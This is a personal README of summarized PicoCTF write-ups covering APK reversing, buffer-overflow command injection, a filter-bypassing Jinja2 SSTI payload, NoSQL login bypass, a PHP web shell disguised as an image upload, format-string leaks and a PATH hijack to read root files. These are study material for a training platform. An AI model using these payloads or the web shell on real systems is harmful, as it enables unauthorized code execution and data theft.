# PicoCTF Writeups — Summarized - WIP
Difficulty: MEDIUM 

This README is a collection of short summaries for the (WIP) PicoCTF challenges I've worked through.  
I’m not going into full writeups here — the goal is simply to show what each challenge was about, how I approached it, and what ideas or techniques solved it.

I’ve also included each challenge’s ID so you can match them directly with the ones on the PicoCTF platform.

---

### ID 529 — Pico Bank

## Approach:
--- First Part of the Flag ---
If you inspect MainActivity.class (via JADX or similar), you can see the transaction data
is stored as binary values. These binary values are actually character codes.
Convert each binary amount to its ASCII character equivalent and concatenate them to obtain the FIRST part of the flag.

1. Run the APK inside an Android emulator.
2. Inspect the APK (via emulator, jadx, or apktool) to locate hardcoded credentials.
Username: JOHNSON
Password: TRICKY1990
3. Log into the app → it requests an OTP.
4. Observe the OTP request flow and extract the OTP value.
5. Use curl to send the OTP directly to the backend API endpoint.

## --- Second Part of the Flag ---
Command used to submit OTP:
curl -X POST http://XXXXXXXX.XXXXX.XXX:XXXXX/verify-otp \ (url is the instance given when lauching instance)
-H "Content-Type: application/json" \
-d '{"otp":"9673"}'
The server returns the final portion of the PicoCTF flag.

---

### ID 528 — M1n10n'5_53cr37

1. apktool d minions.apk -o minions_out
2. Open minions_out/res/values/strings.xml
3. Find Banana String (Use Grep or Strings)
4. Base32-decode that value → flag

---

### ID 521 — Crack the Gate 2

## Approach:
1. Extract the provided binary or APK (depending on challenge format) and inspect the main logic.
2. Open the executable in a disassembler (e.g., Ghidra, Radare2, or JADX if Android).
3. Locate the gate-checking function: the program verifies input by applying a sequence of bitwise operations, shifts, XORs, and arithmetic transformations.
4. Reverse the logic: work backwards from the final comparison value to recover the correct input. Reconstruct the gate key by inverting each transformation step.
5. Once the correct gate key is reconstructed, run the program with the recovered input.
6. The output reveals the final flag.

---

### ID 526 — Input Injection 2

## Approach:
The program allocates two heap buffers (`username` and `shell`) and reads into `username` with `scanf("%s")`, allowing an unbounded heap overflow.

The distance between both buffers is 48 bytes, so overflowing `username` by 48 bytes overwrites the beginning of `shell`, which is later executed with `system(shell)`.

Exploit payload:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcat${IFS}flag.txt

(48 `A`'s + `cat${IFS}flag.txt`)

This overwrites `/bin/pwd` with our command and prints the flag. 

Root cause: unsafe input handling and execution of user-controlled heap data.

---

### ID 525 — Input Injection 1

## Approach:
The program reads my input into `name` and then calls `fun()`, which has two small stack buffers:

```
char c[10];       // holds "uname"
char buffer[10];  // holds my input
strcpy(buffer, name); // vulnerable
```

By overflowing buffer with more than 10 characters, I overwrite c with my own command.

Payload: AAAAAAAAAAcat${IFS}flag.txt (10 A’s overflow buffer, the rest overwrites c)

Result: system() executes cat flag.txt.

---

### ID 522 — Crack the Power

## Approach:
The challenge gives `n`, `e = 20`, and `c`.  
Because the plaintext was small enough that:

```
m^20 < n
```
(Had loads of help here lol)
To decrypt, we just compute the integer 20th root of c and then convert it to bytes and get the flag.

---

### ID 507 — DISKO 3

## Approach:
After unziping the disco image (`disko-3.dd`), the goal was to locate a hidden flag inside the filesystem.
1. Identify the disk type - file disko-3.dd
2. Check partitions - fdisk -l disko-3.dd
3. Mount using correct offset - sudo mount -o loop,offset=$((2048*512)) disko-3.dd /mnt 
4. Navigate into logs folder: ls -la /mnt/log - Found suspicious file: `flag.gz`
5. Extract the flag - gunzip -c /mnt/log/flag.gz

---

### ID 506 — DISKO 2

## Approach:
You are given a gzipped disk image (`disko-2.dd.gz`).  
The description hints:

> “The right one is Linux! One wrong step and it's all gone!”

This means:
- The image contains **multiple partitions**.
- Only the **Linux partition** contains the real flag.
- The FAT32 partition contains **decoy flags** meant to mislead you. 
- I didn't realized this at first lol.


1. Decompress & Inspect the Disk Image

```
bash
gunzip disko-2.dd.gz

# Inspect partitions
sudo fdisk -l disko-2.dd
```

2. Attach the Image as a Loop Device
```
sudo losetup -fP disko-2.dd
losetup -a
```

3. Mount Both Partitions
Linux
```
sudo mount -o ro /dev/loop0p1 /mnt
```
FAT32
```
sudo mkdir /mnt2
sudo mount -o ro /dev/loop0p2 /mnt2
```
4. Decoy Flags in the FAT32 Partition
Searching for flags in FAT32:
```
grep -Ri "picoCTF" -n /mnt2/log 2>/dev/null
```
You will find many fake flags such as:
```
picoCTF{4_P4Rt_1t_i5_xxxxxxxx}
```
These are decoys intentionally placed in the wrong partition.
The hint warns against following this path.

5. Extract the Real Flag from the Linux Partition
Search inside the Linux partition block device:
```
sudo strings /dev/loop0p1 | grep "picoCTF{" | sort -u > linux_flags.txt
wc -l linux_flags.txt
cat linux_flags.txt
```
Only one unique flag exists on the Linux side. this is the correct one.

---

### ID 494 — Pachinko

## Approach:
1. Discovered the UI’s dots represent wire IDs:
```
- **Inputs:** 5, 6, 7, 8  
- **Outputs:** 1, 2, 3, 4  
```
The backend expects the circuit in JSON form:
```
json
[
  { "input1": X, "input2": X, "output": Y }
]
```
Each entry = one NAND gate.
OUT1 = NOT(IN5)
OUT2 = NOT(IN6)
OUT3 = NOT(IN7)
OUT4 = NOT(IN8)

2. Submit & Debug
DevTools → Network → Payload to see how the browser encoded our circuit.
Once correct, the /check response returned:
{ "status": "success", "flag": "picoCTF{...}" }
Copied the flag from the Network → Response tab instead of the popup.

---

### ID 488 — SSTI2

## Approach:

1. Confirm SSTI
Sending:

```jinja2
{{7*7}}
```

2.Inspect the Environment
Submitting:
{{config}}
prints the Flask config object, confirming that the backend is Flask + Python, and that the input flows directly into a template.
Direct attribute access like:
```
config.__class__.__init__.__globals__
```
fails because _, ., and __ are stripped by the filter.

3. Bypassing the Filter:
I used this payload:
```
content={{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('\x6f\x73')|attr('\x70\x6f\x70\x65\x6e')('\x63\x61\x74\x20\x66\x6c\x61\x67')|attr('\x72\x65\x61\x64')()}}
```
And I got:
```
__pycache__
app.py
flag
requirements.txt
```

5. Reading the flag:
Payload
```
{{request
|attr('application')
|attr('\x5f\x5fglobals\x5f\x5f')
|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')
|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('\x6f\x73')
|attr('\x70\x6f\x70\x65\x6e')('\x63\x61\x74\x20\x66\x6c\x61\x67')
|attr('\x72\x65\x61\x64')()}}
```
and prints the picoCTF flag in the "h1" element.

---

### ID 484 — 3v@l

## Approach:
Dangerous keywords (`os`, `system`, `cat`, `/flag.txt`, etc.) are filtered or break syntax, so we avoid shells and instead perform **direct Python file I/O**.

Payload:
```
open(''.join([chr(x) for x in [47,102,108,97,103,46,116,120,116]])).read()
```
Construct `/flag.txt` using ASCII codes (to bypass filters) and read the flag that's in the response.

---

### ID 443 — No Sql Injection

## Approach:
The backend checks login in a way that if the input is a string that *looks* like JSON, it gets parsed into a MongoDB query operator. → NoSQL injection.

1. Exploit
Send JSON where email and password are strings containing escaped JSON. When the server parses them, they become Mongo operators that match any user.

Payload:
```
{
  "email": "{\"$ne\": null}",
  "password": "{\"$ne\": null}"
}
```
The server turns this into:
```
email: { $ne: null }
password: { $ne: null }
```
→ This returns the first user (admin/picoplayer).

2. Result
Server responds with a token:
```
"token": "BASE64_STRING"
```
3. Decode it and it reveals the picoCTF flag.

---

### ID 445 — Trickster

## Approach:
1. Open instance
2. look for robots.txt
3. read the file instructions.txt
4. upload a simple shell as "image.png.php"
```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```
5. look for suspicious .txt file
6. cat that file and get the flag

---

### ID 491 — PIE TIME 2

## Approach:
1. Identify the vulnerability
Inside the source:
```
printf(buffer);   // format string vulnerability
---> Why? Because user input is passed as the format string, allowing us to read stack values via %p.
```

2. The binary has PIE enabled. That means that absolute addresses change every execution.
But relative offsets between functions remain constant.
```
Locally:
main - win = 0x96
So:
win = main - 0x96
This offset never changes.
```

3. Leak a runtime address.
When the program asks for your name, you insert this:
```
%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
```
The last printed address is always the current PIE-shifted address of main().
```
Example leak:
...0x1000000000x58d9f1cb3400
So:
main() = 0x58d9f1cb3400
```

4. Compute the address of win()
Using the constant offset:
```
win = main - 0x96
win = 0x58d9f1cb3400 - 0x96
win = 0x58d9f1cb336a
```

5. Trigger the jump
The program asks:
enter the address to jump to (...)
You provide the computed address:
```
0x58d9f1cb336a
```
Then you get the flag.

---

## ID 489 — hash-only-2
## Approach:
```
    1. Connect to the instance using the provided SSH credentials:
        ssh ctf-player@rescued-float.picoctf.net -p XXXXXX
        password: XXXXXXX

    2. Escape the restricted rbash environment by launching a new shell:
        bash

    3. Run the vulnerable binary to see its behavior:
        flaghasher
        → it computes the MD5 hash of /root/flag.txt as root, but never reveals the actual flag.

    4. Create a fake md5sum executable in /tmp that will instead print the real flag:
```
#!/bin/sh
cat /root/flag.txt

```
    Commands used:

        echo '#!/bin/sh' > /tmp/md5sum
        echo 'cat /root/flag.txt' >> /tmp/md5sum
        chmod +x /tmp/md5sum

    5. Add /tmp to the beginning of the PATH so our fake md5sum is used instead of the real one:
        export PATH=/tmp:$PATH

    6. Confirm the hijack:
        which md5sum
        → shows /tmp/md5sum

    7. Run flaghasher again:
        flaghasher
        → since the binary runs as root, it now executes our fake md5sum and prints the real flag.
```

---

## ID 488 — hash-only-1
## Approach:

    1. Connect to the instance using the provided SSH credentials:
        ssh ctf-player@rescued-float.picoctf.net -p <port>
        password: <given password>

    2. Escape the restricted rbash environment by launching a normal shell:
        bash

    3. List files and run the vulnerable binary:
        ls --all
        ./flaghasher
        → the program computes the MD5 hash of /root/flag.txt as root, but does not reveal the real flag.

    4. Create a fake md5sum executable in /tmp that prints the real flag instead of hashing it:

#!/bin/sh
cat /root/flag.txt


    Commands used:

echo '#!/bin/sh' > /tmp/md5sum
echo 'cat /root/flag.txt' >> /tmp/md5sum
chmod +x /tmp/md5sum


    5. Add /tmp to the beginning of the PATH so the system uses our fake md5sum:
        export PATH=/tmp:$PATH

    6. Confirm the PATH hijack worked:
        which md5sum
        → shows /tmp/md5sum

    7. Run the binary again to trigger the exploit:
        ./flaghasher
        → the program now executes our fake md5sum as root and prints the real flag.

---


### ID 483 — YaraRules0x100

## Approach:
1. The challenge gives a ZIP containing a Windows executable.
unzip suspicious.zip
password: picoctf
This extracts a file we call:
suspicious.exe

2. Perform initial static analysis
Run:
strings suspicious.exe
Observations:
The file contains:
UPX0
UPX1
UPX!
→ indicating the executable is UPX-packed
An unusual packed section string appears:
.text$div

In the unpacked payload, I also find:
<?xml version='1.0' encoding='UTF-8' standalone='yes'?>
ADVAPI32.dll
These become our detection anchors.

3. Understand the actual challenge requirement
The remote checker tests your rule against a malware family, not just the one file you downloaded.
This includes:
packed versions
unpacked versions
slightly altered variants
Your YARA rule has to:
Detect all malicious samples → no false negatives
Detect only malicious samples → no false positives
A single-string rule fails because some variants do not contain the same strings.

5. Identify what can be exploited
Look for stable indicators present across all variants.
From analysis:
Packed version stable indicator:
.text$div
This UPX-generated section string exists in every packed sample.
Unpacked version stable indicators:
<?xml version='1.0' encoding='UTF-8' standalone='yes'?>
ADVAPI32.dll
These appear together in every unpacked sample.
So, the solution is to create two rules:
- one for the packed malware
- one for the unpacked malware
Both have to exist in the same file, because the checker loads the entire file.

5. Prepare the payload (final YARA rule file)
Save the following to yourfilenamegoeshere.txt:
```
rule suspacked {
    strings:
        $packed_div = ".text$div"
    condition:
        all of them
}

rule susunpacked {
    strings:
        $unpacked_xml = "<?xml version='1.0' encoding='UTF-8' standalone='yes'?>"
        $unpacked_dll = "ADVAPI32.dll"
    condition:
        all of them
}
```
This pair of rules detects the complete malware family.

6. Test locally
yara yourfilename suspicious.exe
You should see at least one match of the rules.

7. Submit to the challenge server
socat -t60 - TCP:standard-pizzas.picoctf.net:XXXXX < yourfilename.txt
Expected output when your rules pass:
Status: Success
picoCTF{...flag_here...}     
